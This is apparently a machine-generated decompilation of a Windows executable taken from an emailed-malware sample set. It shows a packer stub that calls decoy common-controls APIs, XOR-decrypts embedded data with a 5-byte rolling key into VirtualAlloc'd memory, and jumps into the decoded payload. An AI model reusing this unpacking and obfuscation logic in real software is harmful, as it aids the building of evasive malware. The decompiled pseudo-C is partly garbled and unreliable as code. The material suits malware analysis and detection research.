/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0530/ia32_pe/subject.exe'
 */

/*	Procedure: 0x1310D000 - 0x1310D0A8
 *	Argument size: -12
 *	Local size: 36
 *	Save regs size: 0
 */

L1310D000(A8, Ac, A10, A18, A1c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe7;
	/* unknown */ void  Vffffffe8;



    edx = *(ebp + 20);
    *edx = A10;
    eax = A18;
    Vffffffe4 = 0;
    Vffffffe4 = Vffffffe4 + 5;
    Vffffffe4 = Vffffffe4 / Vffffffe4;
    Vffffffe8 = Vffffffe4 % Vffffffe4;
    for(Ac = Ac + A18; 1; edi = esi) {
        edx = A10;
        A10 = A10 - 1;
        if(edx == 0) {
            break;
        }
        *__imp__AddAtomW(-1207959552);
        al = *Ac;
        Vffffffe7 = al;
        (save)Vffffffe8 + A1c;
        ebx = 0;
        (restore)edx;
        ebx = *edx & 255;
        Vffffffe7 = Vffffffe7 ^ ebx;
        esi = A8;
        *esi = Vffffffe7;
        Vffffffe8 = (Vffffffe8 & 65535) + 1;
        if(Vffffffe8 == 5) {
            Vffffffe8 = 0;
        }
        A8 = A8 + 1;
        Ac = Ac + 1;
    }
}

/*	Procedure: 0x1310D0A9 - 0x1310D4FD
 *	Argument size: -702
 *	Local size: 724
 *	Save regs size: 0
 */

__entry_point__()
{
	/* unknown */ void  Vfffffd3c;
	/* unknown */ void  Vfffffd40;
	/* unknown */ void  Vfffffd94;
	/* unknown */ void  Vfffffd9c;
	/* unknown */ void  Vfffffda0;
	/* unknown */ void  Vfffffda4;
	/* unknown */ void  Vfffffdac;
	/* unknown */ void  Vfffffdb0;
	/* unknown */ void  Vfffffdb8;
	/* unknown */ void  Vfffffdbc;
	/* unknown */ void  Vfffffdc0;
	/* unknown */ void  Vfffffdc4;
	/* unknown */ void  Vfffffdc8;
	/* unknown */ void  Vfffffdcc;
	/* unknown */ void  Vfffffdd0;
	/* unknown */ void  Vfffffdd1;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    *__imp__InitCommonControls();
    *__imp__GetLastError();
    (save)616;
    (save)178257920;
    (save)12386304;
    *__imp__ImageList_DragEnter();
    (save)524288;
    *__imp__AddAtomW();
    (save)259072;
    (save)876544;
    (save)146432;
    (save)1073741824;
    (save)4587520;
    (save)2310144;
    ecx = *__imp__ImageList_Draw() + edx;
    ecx = ecx ^ -2147221008;
    Vfffffd40 = ecx;
    Vfffffdc4 = Vfffffd40;
    ecx = esi;
    Vfffffdd0 = 109;
    Vfffffdd1 = 731325884;
    Vfffffdc4 = Vfffffdc4 + -1827872438;
    Vfffffdc8 = *Vfffffdc4;
    (save) & Vfffffdd0;
    (save)0;
    if(Vfffffd40 != -2147221008) {
        (save)0;
    }
    (save) & Vfffffff4;
    (save)4;
    (save) & Vfffffdc8;
    (save) & Vfffffdc8;
    L1310D000();
    Vffffffdc = ebp;
    Vffffffdc = Vffffffdc + 4;
    Vfffffdac = *(Vfffffdc4 + 4);
    (save) & Vfffffdd0;
    (save)4;
    (save) & Vfffffff4;
    (save)4;
    (save) & Vfffffdac - 4;
    (save) & Vfffffdac;
    L1310D000();
    Vfffffff0 = *(Vfffffdc4 + 8);
    (save) & Vfffffdd0;
    (save)8;
    (save) & Vfffffff4;
    (save)4;
    (save) & Vfffffff0 - 8;
    (save) & Vfffffff0;
    L1310D000();
    Vffffffe0 = Vfffffdc4 + 12;
    Vffffffe4 = 319815680;
    Vfffffdb0 = Vffffffe4 + 4096;
    Vfffffdb8 = 12;
    Vffffffe8 = *Vffffffe0;
    (save) & Vfffffdd0;
    (save)Vfffffdb8;
    (save) & Vfffffff4;
    (save)4;
    (save) & Vffffffe8 - Vfffffdb8;
    (save) & Vffffffe8;
    L1310D000();
    Vffffffe8 = Vffffffe8 + Vffffffe4;
    Vfffffdb8 = Vfffffdb8 + 4;
    Vffffffe0 = Vffffffe0 + 4;
    Vfffffdbc = *Vffffffe0;
    (save) & Vfffffdd0;
    (save)Vfffffdb8;
    (save) & Vfffffff4;
    (save)4;
    (save) & Vfffffdbc - Vfffffdb8;
    (save) & Vfffffdbc;
    L1310D000();
    Vfffffdb8 = Vfffffdb8 + 4;
    Vffffffe0 = Vffffffe0 + 4;
    Vffffffd8 = Vfffffff0 * 8 + 12;
    (save)64;
    (save)12288;
    Vfffffd3c = Vffffffd8;
    Vfffffd3c = Vfffffd3c + Vfffffdac;
    Vfffffd3c = Vfffffd3c + Vfffffdc8;
    (save)Vfffffd3c;
    (save)Vfffffd40 - -2147221008;
    Vfffffda4 = *__imp__VirtualAlloc();
    Vfffffff8 = Vffffffe8 + Vffffffd8;
    Vfffffdc0 = Vffffffd8;
    Vfffffda0 = Vfffffdc0;
    Vfffffffc = 0;
    for(Vffffffec = 0; 1 != 0; Vfffffdc0 = Vfffffdc0 + 1) {
        if(Vfffffda0 == Vfffffdbc) {
            Vfffffffc = Vfffffffc + 1;
            if(Vfffffffc == Vfffffff0) {
                break;
            }
            Vffffffe8 = *Vffffffe0;
            (save) & Vfffffdd0;
            (save)Vfffffdb8;
            (save) & Vfffffff4;
            (save)4;
            (save) & Vffffffe8 - Vfffffdb8;
            (save) & Vffffffe8;
            L1310D000();
            Vffffffe8 = Vffffffe8 + Vffffffe4;
            Vfffffdb8 = Vfffffdb8 + 4;
            Vffffffe0 = Vffffffe0 + 4;
            Vfffffdbc = *Vffffffe0;
            (save) & Vfffffdd0;
            (save)Vfffffdb8;
            (save) & Vfffffff4;
            (save)4;
            (save) & Vfffffdbc - Vfffffdb8;
            (save) & Vfffffdbc;
            L1310D000();
            Vfffffdb8 = Vfffffdb8 + 4;
            Vffffffe0 = Vffffffe0 + 4;
            Vfffffda0 = 0;
            Vfffffff8 = Vffffffe8;
        }
        *(Vfffffda4 + Vffffffec) = *Vfffffff8;
        Vfffffff8 = Vfffffff8 + 1;
        Vffffffec = Vffffffec + 1;
        Vfffffda0 = Vfffffda0 + 1;
    }
    (save) & Vfffffdd0;
    (save)Vffffffd8;
    (save) & Vfffffdcc;
    (save)Vfffffdac;
    (save)Vfffffda4 - Vffffffd8;
    (save)Vfffffda4;
    L1310D000();
    Vfffffd94 = Vfffffda4 + 3920;
    Vfffffd9c = Vfffffd94;
    (save)Vffffffdc;
    (save) & Vfffffdd0;
    (save)Vfffffdac;
    (save)Vfffffdc8;
    (save)Vfffffda4;
    (save)Vfffffda4 + Vfffffdac;
    Vfffffd9c();
    ecx = ecx ^ ebx;
    return(*__imp__ExitProcess(0));
}

stack space not deallocated on return
/*	Procedure: 0x1310D4FE - 0x1310D5E4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L1310D4FE()
{



    (save)ebp;
    ebp = esp;
    (save)eax | 471040;
    (save)131072;
    (save)39845888;
    (save)esi;
    *%fs:0x0] = esp;
    esp = esp - 3866624;
    (save)3152;
    (save)edx;
    (save) *%fs:0x0];
    *(ebp - 40) = esp;
    *(ebp - 8) = edx;
    ecx = 12032;
    *__imp__GetEffectiveClientRect();
    ecx = ecx ^ edx;
    *(ebp - 72) = *edx;
    if(*(ebp - 76) == edi) {
        edi = 1360;
    }
    (save)ebp - 124;
    *(ebp - 100) = *(ebp - 116);
    eax = *__imp__CreateToolbar();
    (save)ebp - 36;
    (save) *(ebp - 40);
    edi = ebp - 100;
    (save)eax;
    edi = ebp - 112;
    (save)eax;
    (save)ebp - 96;
    edi = ebp - 124;
    (save)edi;
    (save)edi;
    eax = *(L1310D5EC());
    *(ebp - 116) = eax;
    if(!(esp = esp + 36)) {
        do {
            *(ebp - 112) = ecx;
        } while(!(ecx = ecx + 1) && edx != 603979776);
        != ? 0x1310d59b : ;
L1310d597:
        ecx = ecx + 1;
        *(ebp - 116) = edx;
L1310d59b:
        al = *ecx;
        esi :: ecx;
        if(edx <= 149946368) {
            goto L1310d597;
        }
        *(ebp - 52) = eax;
        esi = ebp - 64;
        (save)eax;
    } else {
        while(1) {
            if(*esi <= 20) {
                goto L1310d59b;
            }
            eax = eax + 1;
            *(ebp - 116) = eax;
        }
        eax = 14286848;
    }
    *(ebp - 104) = eax;
    *__imp__GetSystemTimeAsFileTime(ebp + -704, 18350080, eax, ecx, eax);
    (save)ecx;
    eax = *(ebp - 20);
    *(ebp - 120) = *( *eax);
}

/*	Procedure: 0x1310D5E5 - 0x1310D5EB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L1310D5E5()
{



    esp = *(ebp - 24);
    (save) *(ebp - 120);
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x1310D5EC - 0x1310D5F5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L1310D5EC()
{



    edi = 22544384;
    (restore)ecx;
    return(0);
}

/*	Procedure: 0x1310D5F6 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L1310D5F6()
{



}

/* address  size  */
/* 0x1310d0a9       0 */ /* unknown */ void 	__entry_point__;
/* 0x1310e0ac       0 */ /* unknown */ void 	__imp__CreateStatusWindowA;
/* 0x1310e0b0       0 */ /* unknown */ void 	__imp__ShowHideMenuCtl;
/* 0x1310e0b4       0 */ /* unknown */ void 	__imp__LBItemFromPt;
/* 0x1310e0b8       0 */ /* unknown */ void 	__imp__DrawStatusTextA;
/* 0x1310e0bc       0 */ /* unknown */ void 	__imp__ImageList_DragEnter;
/* 0x1310e0c0       0 */ /* unknown */ void 	__imp__ImageList_Draw;
/* 0x1310e0c4       0 */ /* unknown */ void 	__imp__CreateToolbar;
/* 0x1310e0c8       0 */ /* unknown */ void 	__imp__GetEffectiveClientRect;
/* 0x1310e0cc       0 */ /* unknown */ void 	__imp__CreateMappedBitmap;
/* 0x1310e0d0       0 */ /* unknown */ void 	__imp__InitCommonControls;
/* 0x1310e0d4       0 */ /* unknown */ void 	__imp__MenuHelp;
/* 0x1310e0dc       0 */ /* unknown */ void 	__imp__AddAtomW;
/* 0x1310e0e0       0 */ /* unknown */ void 	__imp__FileTimeToSystemTime;
/* 0x1310e0e4       0 */ /* unknown */ void 	__imp__GetFullPathNameW;
/* 0x1310e0e8       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x1310e0ec       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x1310e0f0       0 */ /* unknown */ void 	__imp__GetCurrentThreadId;
/* 0x1310e0f4       0 */ /* unknown */ void 	__imp__GetSystemTimeAsFileTime;
/* 0x1310e0f8       0 */ /* unknown */ void 	__imp__GetCurrentProcessId;
/* 0x1310e0fc       0 */ /* unknown */ void 	__imp__GetCurrentProcess;
/* 0x1310e100       0 */ /* unknown */ void 	__imp__SetUnhandledExceptionFilter;
/* 0x1310e104       0 */ /* unknown */ void 	__imp__TerminateProcess;
/* 0x1310e108       0 */ /* unknown */ void 	__imp__QueryPerformanceCounter;
/* 0x1310e10c       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x1310e110       0 */ /* unknown */ void 	__imp__GetTickCount;
/* 0x1310e114       0 */ /* unknown */ void 	__imp__ExitProcess;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
